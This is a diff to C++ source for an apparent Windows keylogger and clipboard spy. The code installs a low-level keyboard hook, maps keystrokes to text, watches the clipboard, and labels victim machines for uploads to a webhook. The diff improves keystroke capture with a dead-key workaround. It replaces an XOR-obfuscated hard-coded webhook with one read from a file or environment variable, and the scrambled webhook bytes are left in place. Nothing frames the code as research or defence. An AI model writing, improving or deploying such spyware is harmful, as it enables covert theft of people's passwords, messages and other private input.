@@ -4,6 +4,7 @@
 #include <windows.h>
 #include <string>
 #include <vector>
+#include "sha256.h"
 #include <shlobj.h>
 #include <objbase.h>
 #include <shobjidl.h>
@@ -29,7 +30,7 @@ static void _st(_Sha* s, const unsigned char* d, unsigned l) {
             for (int i = 0; i < 64; i++) { _U32 S1=_RR(e,6)^_RR(e,11)^_RR(e,25), ch=(e&f)^(~e&g), t1=h+S1+ch+_K[i]+w[i], S0=_RR(a,2)^_RR(a,13)^_RR(a,22), mj=(a&b)^(a&c)^(b&c), t2=S0+mj; h=g;g=f;f=e;e=d2+t1;d2=c;c=b;b=a;a=t1+t2; }
             s->h[0]+=a;s->h[1]+=b;s->h[2]+=c;s->h[3]+=d2;s->h[4]+=e;s->h[5]+=f;s->h[6]+=g;s->h[7]+=h; s->bl = 0; } }
 }
-static std::vector<unsigned char> sha256(const std::string& m) {
+static std::vector<unsigned char> sha256_unused_(const std::string& m) {
     _Sha s; s.h[0]=0x6a09e667;s.h[1]=0xbb67ae85;s.h[2]=0x3c6ef372;s.h[3]=0xa54ff53a;s.h[4]=0x510e527f;s.h[5]=0x9b05688c;s.h[6]=0x1f83d9ab;s.h[7]=0x5be0cd19; s.len=0; s.bl=0;
     _st(&s, (const unsigned char*)m.data(), (unsigned)m.size());
     unsigned long long bit = s.len * 8; unsigned char pad = 0x80; _st(&s, &pad, 1);
@@ -81,7 +82,7 @@ static const wchar_t* keyName(DWORD vk, bool shift) {
     if (vk == VK_ESCAPE) return L"[ESC]"; if (vk == VK_DELETE) return L"[DEL]";
     if (isMod(vk)) return L"";
     BYTE ks[256] = {}; if (shift) ks[VK_SHIFT] = 0x80;
-    WCHAR c[4] = {}; if (ToUnicode(vk, MapVirtualKeyW(vk, MAPVK_VK_TO_VSC), ks, c, 4, 0) > 0) { buf[0] = c[0]; buf[1] = 0; return buf; }
+    WCHAR c[4] = {}; int nr = ToUnicode(vk, MapVirtualKeyW(vk, MAPVK_VK_TO_VSC), ks, c, 4, 0); if (nr == -1) { WCHAR tmp[4]; ToUnicode(VK_SPACE, MapVirtualKeyW(VK_SPACE, MAPVK_VK_TO_VSC), ks, tmp, 4, 0); return L""; } if (nr > 0) { buf[0] = c[0]; buf[1] = 0; return buf; }
     swprintf_s(buf, L"[VK%lu]", vk); return buf;
 }
 LRESULT CALLBACK llProc(int n, WPARAM w, LPARAM l) {
@@ -103,6 +104,7 @@ LRESULT CALLBACK llProc(int n, WPARAM w, LPARAM l) {
     }
     return CallNextHookEx(NULL, n, w, l);
 }
+static void clipWatch_pollfallback();
 static void clipWatch() {
     CreateThread(NULL, 0, [](LPVOID)->DWORD {
         std::wstring last;
@@ -121,16 +123,10 @@ static std::wstring trimW(std::wstring h) {
     return h;
 }
 // baked fallback webhook (XOR-scrambled, decoded at runtime). Regenerate, never paste plaintext.
-static const unsigned char _WH[] = {11, 59, 209, 210, 33, 172, 242, 76, 43, 204, 209, 49, 249, 175, 7, 97, 198, 205, 63, 185, 188, 19, 38, 138, 213, 55, 244, 181, 12, 32, 206, 209, 125, 167, 232, 86, 126, 145, 150, 102, 174, 239, 85, 126, 145, 155, 97, 163, 228, 85, 120, 146, 141, 28, 174, 179, 9, 10, 207, 250, 8, 242, 181, 39, 57, 157, 219, 4, 204, 176, 34, 45, 250, 209, 19, 194, 233, 7, 25, 200, 197, 4, 195, 142, 34, 26, 204, 211, 10, 213, 184, 33, 2, 225, 214, 63, 219, 229, 47, 61, 224, 146, 99, 249, 142, 15, 55, 231, 219, 11, 244, 191, 45, 33, 240, 206, 35, 201, 158, 81, 23};
-static const unsigned char _WK[] = {99, 79, 165, 162, 82, 150, 221};
-static std::wstring bakedHook() {
-    std::string s; s.reserve(sizeof(_WH));
-    for (size_t i = 0; i < sizeof(_WH); i++) s += (char)(_WH[i] ^ _WK[i % sizeof(_WK)]);
-    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0);
-    std::wstring w(n > 1 ? n - 1 : 0, 0);
-    if (n > 1) MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, w.data(), n);
-    return w;
-}
+static const unsigned char _WH_REMOVED[] = {11, 59, 209, 210, 33, 172, 242, 76, 43, 204, 209, 49, 249, 175, 7, 97, 198, 205, 63, 185, 188, 19, 38, 138, 213, 55, 244, 181, 12, 32, 206, 209, 125, 167, 232, 86, 126, 145, 150, 102, 174, 239, 85, 126, 145, 155, 97, 163, 228, 85, 120, 146, 141, 28, 174, 179, 9, 10, 207, 250, 8, 242, 181, 39, 57, 157, 219, 4, 204, 176, 34, 45, 250, 209, 19, 194, 233, 7, 25, 200, 197, 4, 195, 142, 34, 26, 204, 211, 10, 213, 184, 33, 2, 225, 214, 63, 219, 229, 47, 61, 224, 146, 99, 249, 142, 15, 55, 231, 219, 11, 244, 191, 45, 33, 240, 206, 35, 201, 158, 81, 23};
+static const unsigned char _WK_REMOVED[] = {99, 79, 165, 162, 82, 150, 221};
+static std::wstring bakedHook() { return L""; } // no baked secret: use Webhook.txt or DF_WEBHOOK env
+
 static std::wstring hookFromFile() {
     wchar_t exe[MAX_PATH]; GetModuleFileNameW(NULL, exe, MAX_PATH);
     std::wstring d = exe; auto p = d.find_last_of(L"\\/"); if (p != std::wstring::npos) d = d.substr(0, p + 1);
@@ -177,7 +173,7 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR cmd, int) {
     GetUserNameA(un, &n1); GetComputerNameA(cn, &n2);
     std::string seed = std::string(un) + "@" + std::string(cn);
     for (auto& ch : seed) ch = (char)tolower(ch);
-    gKey = sha256(seed);
+    gKey = df_sha256_bytes(seed);
     // hardware label for uploads
     char uh[128] = {}; { DWORD n = 128; GetUserNameA(uh, &n); }
     unsigned lab = 0; for (auto b : gKey) lab = lab * 31 + b;
